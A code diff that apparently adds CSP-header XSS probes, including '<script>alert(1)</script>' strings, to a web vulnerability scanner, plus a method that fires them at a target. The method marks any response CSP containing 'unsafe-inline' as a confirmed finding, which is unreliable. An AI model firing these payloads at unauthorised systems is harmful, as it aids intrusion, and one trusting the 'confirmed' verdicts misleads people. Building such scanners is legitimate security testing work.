@@ -225,6 +225,19 @@ _PAYLOADS_BY_CONTEXT: Dict[str, List[str]] = {
     ],
 }
 
+# ── CSP Header Injection Payloads ─────────────────────────────────────────
+# Cloudflare Emergency WAF Release 2026-03-12: Generic XSS in CSP Header.
+# Targets frameworks that extract/trust values from the request's
+# Content-Security-Policy header without sufficient validation.
+_CSP_HEADER_XSS_PAYLOADS = [
+    "script-src 'unsafe-inline'; default-src *",
+    "script-src 'unsafe-eval' 'unsafe-inline' *; object-src *",
+    "default-src 'none'; script-src data:,<script>alert(1)</script>",
+    "script-src 'nonce-fray'; default-src * 'unsafe-inline'",
+    "report-uri /x?<script>alert(1)</script>",
+    "script-src 'self' 'unsafe-inline'; img-src *; connect-src *",
+]
+
 # ── DOM XSS Sources and Sinks ───────────────────────────────────────────
 
 _DOM_SOURCES = [
@@ -509,6 +522,10 @@ class XSSScanner:
                             ))
                             break
 
+        # Phase 6: CSP header injection (Cloudflare WAF rule 2026-03-12)
+        csp_findings = self._test_csp_header_xss()
+        result.findings.extend(csp_findings)
+
         # DOM XSS finding
         if result.dom_sources and result.dom_sinks:
             result.findings.append(XSSFinding(
@@ -544,6 +561,87 @@ class XSSScanner:
                     continue
                 return True
         return False
+
+    def _test_csp_header_xss(self) -> List[XSSFinding]:
+        """Test for XSS via Content-Security-Policy header injection.
+
+        Cloudflare Emergency WAF Release 2026-03-12: some frameworks trust
+        and extract values from the CSP header in the incoming request
+        without validation. Attackers inject scripts/directives via the
+        header that are processed server-side.
+        """
+        findings = []
+        params = dict(self._orig_params)
+        params[self.param] = self.PROBE
+        if self.method == "GET":
+            qs = urllib.parse.urlencode(params, safe="")
+            path = f"{self._path}?{qs}"
+            body_bytes = None
+        else:
+            path = self._path
+            body_bytes = urllib.parse.urlencode(params).encode("utf-8")
+
+        for csp_payload in _CSP_HEADER_XSS_PAYLOADS:
+            hdrs = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,*/*",
+                "Connection": "close",
+                "Content-Security-Policy": csp_payload,
+            }
+            if self.cookie:
+                hdrs["Cookie"] = self.cookie
+            if body_bytes:
+                hdrs["Content-Type"] = "application/x-www-form-urlencoded"
+            hdrs.update(self.custom_headers)
+
+            try:
+                if self._use_ssl:
+                    ctx = ssl.create_default_context()
+                    if not self.verify_ssl:
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                    conn = http.client.HTTPSConnection(self._host, self._port,
+                                                        timeout=self.timeout, context=ctx)
+                else:
+                    conn = http.client.HTTPConnection(self._host, self._port,
+                                                       timeout=self.timeout)
+                conn.request(self.method, path, body=body_bytes, headers=hdrs)
+                resp = conn.getresponse()
+                resp_body = resp.read(1024 * 512).decode("utf-8", errors="replace")
+                resp_hdrs = {k.lower(): v for k, v in resp.getheaders()}
+                conn.close()
+                self._requests += 1
+            except Exception:
+                continue
+
+            # Check if our CSP payload was reflected in response headers
+            resp_csp = resp_hdrs.get("content-security-policy", "")
+            if csp_payload in resp_csp or "unsafe-inline" in resp_csp:
+                # Server echoed/adopted our CSP — this is exploitable
+                findings.append(XSSFinding(
+                    context="csp_header",
+                    payload=f"CSP: {csp_payload}",
+                    param="Content-Security-Policy header",
+                    reflected=True,
+                    confidence="confirmed",
+                    evidence=f"Server reflected CSP header: {resp_csp[:120]}",
+                ))
+                return findings
+
+            # Check if CSP payload content appears in body (framework extraction)
+            if "<script>alert(1)</script>" in csp_payload and \
+               "<script>alert(1)</script>" in resp_body:
+                findings.append(XSSFinding(
+                    context="csp_header",
+                    payload=f"CSP: {csp_payload}",
+                    param="Content-Security-Policy header",
+                    reflected=True,
+                    confidence="confirmed",
+                    evidence="CSP header value extracted and rendered in body",
+                ))
+                return findings
+
+        return findings
 
     def _detect_filters(self) -> List[str]:
         """Detect what characters/strings are being filtered."""
